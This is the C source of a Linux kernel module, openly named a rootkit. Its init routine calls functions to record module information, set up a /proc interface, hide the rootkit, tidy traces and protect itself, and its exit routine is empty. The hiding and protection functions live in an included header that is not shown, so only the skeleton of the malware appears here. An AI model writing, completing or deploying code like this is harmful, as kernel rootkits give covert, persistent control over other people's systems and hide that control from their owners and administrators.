#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/stat.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include "rootkit_conf.conf.h"

static int __init rootkit_init(void)
{
    module_remember_info();
    proc_init();
    if (failed)
        return 0;
    rootkit_hide();
    tidy();
    rootkit_protect();

    return 0;
}

static void __exit rootkit_exit(void)
{
}

module_init(rootkit_init);
module_exit(rootkit_exit);
